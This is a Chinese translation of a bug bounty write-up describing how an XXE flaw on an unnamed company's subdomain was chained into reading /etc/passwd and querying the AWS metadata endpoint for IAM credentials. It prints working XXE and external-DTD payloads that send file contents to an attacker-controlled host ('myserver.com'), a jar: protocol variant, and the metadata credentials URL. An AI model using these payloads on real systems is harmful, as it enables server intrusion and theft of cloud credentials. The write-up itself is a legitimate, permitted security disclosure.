> 原文链接: https://www.anquanke.com//post/id/234875 


# 从XXE到AWS元数据泄露


                                阅读量   
                                **237770**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者AlMadjus，文章来源：almadj.us
                                <br>原文地址：[https://almadj.us/infosec/xxe-to-aws-metadata-disclosure/﻿](https://almadj.us/infosec/xxe-to-aws-metadata-disclosure/%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01d6993822de1fa879.png)](https://p0.ssl.qhimg.com/t01d6993822de1fa879.png)



最近，我在HackerOne上的一个私人漏洞计划上发现了一个关键漏洞，让我可以获得他们的亚马逊网络服务根密钥。正因为如此，该漏洞被评为10.0级危急，是最高级别的。

我用我的自定义词表通过[ffuf](https://github.com/ffuf/ffuf)运行了这几个子域名并查看其结果。其中一个子域名，最初只是呈现一个空白页，当我进入`//foo`路由时，有一个有趣的页面；注意2个斜杠。在10分钟内，我就发现这里有一个XSS，这个URL被映射在一个啰嗦的错误页面中，我得到了反射型XSS，查询参数中有一个有效载荷。不过后来发现该漏洞是重复的。

几天后，我回来了，想对这个子域进行更深入的研究。在GitHub上，我找到了这个子域的测试凭证和登录有效载荷的仓库，并决定对它进行测试。如果没有GitHub的这个泄漏，我永远不会知道这里有一个登录功能，因为它在任何地方都没有呈现。路径相当晦涩，没有被我的爆破词库收录。

我能够用测试凭证登录，并得到一个允许我上传文件的令牌。由于POST有效载荷是XML，我决定通过测试XXE DTD（XML eXternal Entity Document Type Declaration）来深入测试。

我唯一能调用DTD的地方是在密码字段，用户名是由URL路径定义的。我使用了一个基本的POST有效载荷：

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE passwd [&lt;!ELEMENT passwd ANY&gt;
&lt;!ENTITY xxe SYSTEM "http://webhook.site/foo" &gt;]&gt; 
...
&lt;passwd&gt;&amp;xxe;&lt;/passwd&gt;
```

POST数据发送过去后，我的`webhook.site`接收到服务请求。这样我就知道DTD已经启用了。我还试着在web服务器上查询一个文件，但没有成功。

下一步是尝试检索一个外部DTD。我把`http://webhook.site/foo` 改成了一个虚拟的自托管 DTD，并观察到 Web 应用程序获取了这个文件。

现在我已经拥有了所有需要的东西，可以尝试读取web应用服务器上的文件，并将其内容发送到我自己的服务器上。我发送了一个这样的有效载荷：

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE passwd [!ENTITY % file SYSTEM "file:///etc/passwd"&gt; [&lt;!ENTITY % xxe SYSTEM "http://myserver.com/pwn.dtd"&gt; %xxe; ]&gt; 
...
&lt;passwd&gt;&amp;send;&lt;/passwd&gt;
```

而下面自带的DTD为pwn.dtd：

```
&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://myserver.com/?data=%file;'&gt;"&gt; %all;
```

然而，它并没有像预期的那样工作。虽然Web应用程序确实获取了我的DTD，但我从来没有得到后续的`?data`请求，而是在应用程序中得到了一个错误信息。原来是`/etc/passwd`中的特殊字符破坏了GET请求。

在检查我自己的Linux系统有无特殊字符的单行文件时，我发现了`/etc/hostname`，我就能读取它的内容了。我仍然不满意这样的影响，但我希望能够读取系统中的任何文件，所以我试着通过FTP在应用程序响应中进行外链。不过这些都没有用，所以我把这个漏洞报告给HackerOne，说是一个影响很大的XXE DTD本地文件包含（LFI）。

第二天，我一直在猜测这个漏洞。我对影响并不满意，想试着找一些方法来排查任意文件。分配给我的报告的HackerOne triager希望我也尝试着去排查另一个文件，不过他们对这是一个单行文件也没有意见。

我和[Dee-see](https://twitter.com/dee__see)（伟大的黑客！）聊了聊，他给我发了一个使用`jar:`协议提取文件的链接：<br>[https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf)

> 我翻译过这篇blackhat的议会主题：[https://www.anquanke.com/post/id/231472](https://www.anquanke.com/post/id/231472)

从上面的链接中改编了DTD文件内容，我又试着将`/etc/passwd`导出。

```
&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'jar:%file;/myserver.com!/'&gt;"&gt; %all;
```

而且它真的成功了! 虽然不是作为一个出站的LFI，我能够在服务器的响应中读取整个`/etc/passwd`！我向HackerOne报告了这一情况，他们将我的报告归类为高危害等级。关于`jar:`协议的更多信息，请看[这个](https://gosecure.github.io/xxe-workshop/#7)。它实际上是用来读取`.zip`或`.jar`文件中的文件。不过不知怎么的，它破坏了网络应用，让我可以读取任何文件的内容。

不过我对我的报告还是不完全满意，我一直在想我也许能把这个问题提升到一个更严重的问题。我试着扫描服务器的开放端口，想着也许我可以得到SSH密钥并登录，但只有80和443端口是开放的。然后我问HackerOne是否允许我在服务器上尝试更深的测试，他们同意了。

通过只在文件实体中提供`file:///`，我能够读取一个目录的内容，但我无法读取`/proc/self/environ`，它可能存储了AWS的元数据；同样一些特殊字符破坏了流程。于是我想到把LFI变成SSRF（Server Side Request Forgery），查询典型的AWS元数据端点`http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE`。

当然我不知道`user_role`的值，但通过访问`http://169.254.169.254/latest/meta-data/iam/security-credentials/`，web应用程序很好心地在错误信息中向我透露了他们的信息!

我在HackerOne上向程序报告了这件事，他们将严重程度改为10.0的评价。后来我获得了2000美元的赏金。

我从这件事中学到了什么？总是尝试深入挖掘，不要满足于报告一些事情，除非你已经尝试了一切来提高严重性。当然，如果有疑问，要征求许可。我不喜欢在没有明确许可的情况下撸穿公司的生产服务器，但他们很理解我，并允许我继续进行，只要我不改变或访问敏感数据。
